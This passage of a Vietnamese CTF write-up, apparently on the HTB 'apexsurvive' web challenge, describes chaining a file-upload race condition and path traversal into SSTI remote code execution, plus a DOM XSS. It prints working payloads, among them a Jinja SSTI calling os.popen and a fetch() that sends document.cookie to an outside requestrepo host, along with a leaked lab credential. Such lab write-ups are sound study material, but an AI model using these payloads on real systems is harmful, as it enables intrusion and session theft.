class="n"&gt;uploadedFile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;wf&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/temporaryUpload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;wf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fr&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Contract Added&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;except&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Something went wrong!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Invalid PDF! what are you trying to do?&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Buá»“n á»Ÿ chá»— chá»©c nÄƒng nÃ y khÃ´ng dá»… cÃ³ tÃ­ nÃ o vÃ¬ pháº£i lÃ  admin thÃ¬ má»›i sá»­ dá»¥ng Ä‘Æ°á»£c, bÃ i toÃ¡n lÃºc nÃ y láº¡i quay vá» viá»‡c lÃ m tháº¿ nÃ o Ä‘á»ƒ lÃªn Ä‘Æ°á»£c admin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tiáº¿p tá»¥c Ä‘á»c source, mÃ¬nh ngá»‘n khoáº£ng 1 buá»•i tiáº¿p theo Ä‘á»ƒ nghÄ© cÃ¡ch bypass admin nhÆ°ng cháº³ng cÃ³ cÃ¡ch nÃ o kháº£ thi, cÅ©ng may lÃ  cuá»™c thi kÃ©o dÃ i nhiá»u ngÃ y nÃªn mÃ¬nh cÃ³ nhiá»u thá»i gian suy nghÄ© hÆ¡n. LÃºc nÃ y mÃ¬nh Ä‘Ã£ chá»‹u vÃ  khÃ´ng tÃ¬m Ä‘Æ°á»£c cÃ¡ch leo lÃªn admin, nhÆ°ng láº¡i biáº¿t Ä‘Æ°á»£c vuln sau khi lÃªn admin (aizzz chÃ­c tá»‹c). Nháº­n tháº¥y chá»©c nÄƒng report sáº½ láº¥y credential cá»§a admin vÃ  gá»­i Ä‘i nÃªn mÃ¬nh sá»­ dá»¥ng chÃºng Ä‘Äƒng nháº­p vÃ o admin exploit lá»—i upload file, cÃ¡c teammates sáº½ lo vá»¥ leo lÃªn admin :laughing:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;2024-03-16 22:34:49 127.0.0.1 - - [16/Mar/2024 15:34:49] &amp;#34;GET /visit?productID=1&amp;amp;email=xclow3n@apexsurvive.htb&amp;amp;password=d8Bfk5Fw6oiROrxqrS2TmLc4NF1ZHU3r0OQfZSzbHna2DGljQbEmNG6st7uZ9QQ7 HTTP/1.1&amp;#34; 200 -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="exploit-file-upload"&gt;Exploit file upload
&lt;/h3&gt;&lt;p&gt;NÃ³i Ä‘áº¿n upload file python thÃ¬ cÃ¡ch Ä‘áº§u tiÃªn mÃ¬nh nghÄ© Ä‘áº¿n lÃ  upload ghi Ä‘Ã¨ file &lt;code&gt;__init__.py&lt;/code&gt; nhÆ°ng web nÃ y láº¡i khÃ´ng cÃ³ nÃªn hÆ°á»›ng Ä‘i Ä‘Ã³ khÃ´ng kháº£ thi cho láº¯m :cry:
VÃ¬ má»›i gáº§n Ä‘Ã¢y cÃ³ má»™t bÃ i upload python cÅ©ng na nÃ¡, teammate &lt;a class="link" href="https://hackmd.io/@machongnam" target="_blank" rel="noopener"
&gt;MacHongNam&lt;/a&gt; Ä‘Ã£ gá»£i Ã½ mÃ¬nh cÃ¡ch ghi Ä‘Ã¨ file html vÃ  ssti trong file Ä‘Ã³ Ä‘á»ƒ khi server render_template sáº½ trigger ssti Ä‘á»ƒ RCE. Äiá»u kiá»‡n lÃ  file templates Ä‘Ã³ chÆ°a Ä‘Æ°á»£c render láº§n nÃ o, vÃ¬ render_template sáº½ ghi nhá»› cÃ¡c láº§n render nÃªn náº¿u render lá»—i kháº£ nÄƒng pháº£i cháº¡y láº¡i docker lÃ m láº¡i lÃ  ráº¥t cao
MÃ¬nh sáº½ chá»n templates &lt;code&gt;info.html&lt;/code&gt; Ä‘Æ°á»£c render á»Ÿ path &lt;code&gt;/&lt;/code&gt; Ä‘á»ƒ inject -&amp;gt; trang chá»§ giá»›i thiá»‡u, chá»‰ cáº§n lÃºc Ä‘áº§u mÃ¬nh truy cáº­p tháº³ng vÃ o path &lt;code&gt;/challenge&lt;/code&gt; vÃ  &lt;code&gt;/email&lt;/code&gt; lÃ  Ä‘Æ°á»£c&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@challengeInfo.route(&amp;#39;/&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def info():
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return render_template(&amp;#39;info.html&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;File sau khi Ä‘Æ°á»£c upload sáº½ &lt;strong&gt;lÆ°u&lt;/strong&gt; vÃ o &lt;code&gt;/tmp/temporaryUpload&lt;/code&gt; rá»“i má»›i Ä‘Æ°á»£c check, sau khi check thÃ nh cÃ´ng ná»™i dung Ä‘Æ°á»£c Ä‘Æ°a vÃ o folder contracts hoáº·c lÃ  tráº£ vá» thÃ´ng bÃ¡o invalid PDF.
=&amp;gt; Pháº£i máº¥t 2 láº§n ghi file thÃ¬ file má»›i Ä‘Æ°á»£c ghi thÃ nh cÃ´ng, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ lá»£i dá»¥ng lÃºc file pdf Ä‘ang Ä‘Æ°á»£c check Ä‘á»ƒ upload 1 file html ná»¯a tháº¿ chá»— file pdf cÅ© =&amp;gt; &lt;strong&gt;race condition&lt;/strong&gt;, sau Ä‘Ã³ sá»­ dá»¥ng path traversal ghi Ä‘Ã¨ html lÃ  cÃ³ thá»ƒ rce thÃ nh cÃ´ng rá»“i
MÃ¬nh báº¯t tay vÃ o viáº¿t script upload file race condition nhÆ°ng báº±ng má»™t lÃ½ do gÃ¬ Ä‘áº¥y mÃ  script cá»§a mÃ¬nh Ä‘á»u ghi Ä‘Ã¨ pdf vÃ o templates thay vÃ¬ file html mÃ  mÃ¬nh mong muá»‘n =))). MÃ¬nh stuck á»Ÿ Ä‘Ã¢y cÅ©ng pháº£i 2 tiáº¿ng trÆ°á»›c khi quyáº¿t Ä‘á»‹nh mÃ©o dÃ¹ng script python ná»¯a mÃ  chuyá»ƒn qua xÃ i Burp Repeater cho nÃ³ nhanh.
Server check pdf cháº·t nÃªn mÃ¬nh sáº½ gá»­i 1 pdf valid láº¥y máº«u request, vÃ  file html mÃ¬nh copy nguyÃªn tá»« tháº±ng gá»‘c vÃ  nhÃ©t thÃªm dÃ²ng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% print(namespace.__init__.__globals__.os.popen(&amp;#39;/readflag&amp;#39;).read()) %}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Thay Ä‘á»•i tÃªn file cá»§a cÃ¡c file html thÃ nh &lt;code&gt;/app/application/templates/info.html&lt;/code&gt;, mÃ¬nh gá»­i Ä‘i cÃ¹ng lÃºc 1 req upload pdf vÃ  6 req upload html
&lt;img src="https://hackmd.io/_uploads/BJIR-rXRp.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sau má»™t há»“i spam Ctrl Space thÃ¬ mÃ¬nh Ä‘Ã£ ghi Ä‘Ã¨ Ä‘Æ°á»£c file info.html
&lt;img src="https://hackmd.io/_uploads/SyOQfBmCp.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Khai thÃ¡c thÃ nh cÃ´ng!!
&lt;img src="https://hackmd.io/_uploads/SJwvMBmAa.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;Tuy ráº±ng Ä‘Ã£ cÃ³ thá»ƒ khai thÃ¡c thÃ nh cÃ´ng, nhÆ°ng mÃ¬nh váº«n chÆ°a tÃ¬m Ä‘Æ°á»£c cÃ¡ch nÃ o Ä‘á»ƒ cÃ³ thá»ƒ lÃªn Ä‘Æ°á»£c admin, cÃ¹ng lÃºc nÃ y teammate &lt;a class="link" href="https://hackmd.io/@machongnam" target="_blank" rel="noopener"
&gt;MacHongNam&lt;/a&gt; báº£o mÃ¬nh hÃ£y nghÄ© cÃ¡ch Ä‘á»ƒ lÃªn Ä‘Æ°á»£c &lt;strong&gt;isInternal&lt;/strong&gt; nháº±m sá»­ dá»¥ng api /addItem, vÃ¬ mÃ¬nh cÃ³ thá»ƒ dom based XSS táº¡i endpoint /product/product-id&lt;/p&gt;
&lt;h3 id="bypass-sanitized-input-to-trigger-xss"&gt;Bypass sanitized input to trigger XSS
&lt;/h3&gt;&lt;p&gt;Nghe nhÆ° váº­y thÃ¬ mÃ¬nh Ä‘Ã£ tÃ¬m Ä‘áº¿n path addProduct Ä‘á»ƒ thÃªm sáº£n pháº©m, khi Ä‘á»c Ä‘áº¿n &lt;code&gt;product.html&lt;/code&gt; thÃ¬ mÃ¬nh Ä‘Ã£ tháº¥y vÃ¬ sao cÃ³ thá»ƒ dom based XSS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;let&lt;/span&gt; &lt;span class="n"&gt;note&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;note&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;safe&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;clean&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DOMPurify&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sanitize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;note&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;FORBID_ATTR&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;USE_PROFILES&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;}});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;document&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;note&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;innerHTML&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Note lÃ  má»™t thuá»™c tÃ­nh mÃ  mÃ¬nh control khi addProduct -&amp;gt; sá»­ dá»¥ng backtick escape khá»i Ä‘oáº¡n khai bÃ¡o note -&amp;gt; XSS:
&lt;img src="https://hackmd.io/_uploads/BJfcIS7Ca.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJKGwHQRa.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Káº¿t há»£p vá»›i viá»‡c cÃ³ thá»ƒ report cho admin vá» cÃ¡c product, mÃ¬nh cÃ³ payload sau Ä‘á»ƒ láº¥y session cá»§a admin:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;`;fetch(&amp;#34;https://9vja3pan.requestrepo.com/?&amp;#34;+document.cookie);//
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id="bypass-isinternal-with-race-condition"&gt;Bypass isInternal with race condition
&lt;/h3&gt;&lt;p&gt;Tiáº¿p tá»¥c vÃ¹i Ä‘áº§u vÃ o Ä‘á»‘ng source code, mÃ¬nh tháº¥y Ä‘Æ°á»£c á»Ÿ Ä‘oáº¡n verifyEmail, email Ä‘Æ°á»£c tÃ¡ch ra thÃ nh tÃªn vÃ  hostname, kiá»ƒu &lt;code&gt;a@gmail.com&lt;/code&gt; thÃ¬ tÃªn lÃ  &lt;code&gt;a&lt;/code&gt; vÃ  hostname lÃ  &lt;code&gt;gmail.com&lt;/code&gt;. Náº¿u nhÆ° hostname cá»§a mÃ¬nh lÃ  &lt;code&gt;apexsurvive.htb&lt;/code&gt; thÃ¬ database sáº½ set &lt;strong&gt;isInternal=&amp;ldquo;true&amp;rdquo;&lt;/strong&gt;, Ä‘Ã¢y chÃ­nh lÃ  chá»— mÃ¬nh cáº§n pháº£i exploit&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def verifyEmail(token):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; user = query(&amp;#39;SELECT * from users WHERE confirmToken = %s&amp;#39;, (token, ), one=True)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if user and user[&amp;#39;isConfirmed&amp;#39;] == &amp;#39;unverified&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; _, hostname = parseaddr(user[&amp;#39;unconfirmedEmail&amp;#39;])[1].split(&amp;#39;@&amp;#39;, 1)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if hostname == &amp;#39;apexsurvive.htb&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; query(&amp;#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=&amp;#34;&amp;#34;, confirmToken=&amp;#34;&amp;#34;, isInternal=&amp;#34;true&amp;#34; WHERE id=%s&amp;#39;, (&amp;#39;verified&amp;#39;, user[&amp;#39;unconfirmedEmail&amp;#39;], user[&amp;#39;id&amp;#39;],))
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; query(&amp;#39;UPDATE users SET isConfirmed=%s, email=%s, unconfirmedEmail=&amp;#34;&amp;#34;, confirmToken=&amp;#34;&amp;#34; WHERE id=%s&amp;#39;, (&amp;#39;verified&amp;#39;, user[&amp;#39;unconfirmedEmail&amp;#39;], user[&amp;#39;id&amp;#39;],))
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; mysql.connection.commit()
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return True
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return False
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ngáº·t nghÃ¨o á»Ÿ chá»— lÃ  trang email cá»§a chÃºng ta chá»‰ nháº­n email gá»­i Ä‘áº¿n &lt;code&gt;test@email.htb&lt;/code&gt; :cry:. Sau khi báº¿&amp;rsquo;s táº¯c má»™t khoáº£ng thá»i gian khÃ¡ lÃ¢u thÃ¬ teammate &lt;a class="link" href="https://hackmd.io/@chuongcd" target="_blank" rel="noopener"
&gt;ChÆ°Æ¡ng&lt;/a&gt; tÃ¬m ra Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ nháº­n Ä‘Æ°á»£c email cá»§a tÃ i khoáº£n cÃ³ hostname &lt;code&gt;apexsurvive.htb&lt;/code&gt; lÃ  &lt;strong&gt;race condition&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Khi chá»‰nh sá»­a profile tá»« má»™t email Ä‘Ã£ verify thÃ nh má»™t email khÃ¡c, server sáº½ tá»± gá»­i token Ä‘áº¿n email Ä‘Ã³&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@api.route(&amp;#39;/profile&amp;#39;, methods=[&amp;#39;POST&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if result:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if result == &amp;#39;email changed&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sendEmail(decodedToken.get(&amp;#39;id&amp;#39;), email)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;Profile updated!&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;API sendVerification cho biáº¿t server sáº½ láº¥y thÃ´ng tin cá»§a user Ä‘Ã³, kiá»ƒm tra xem user Ä‘Ã£ Ä‘Æ°á»£c confirm email chÆ°a, náº¿u chÆ°a sáº½ gá»­i token Ä‘áº¿n email Ä‘Ã³&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
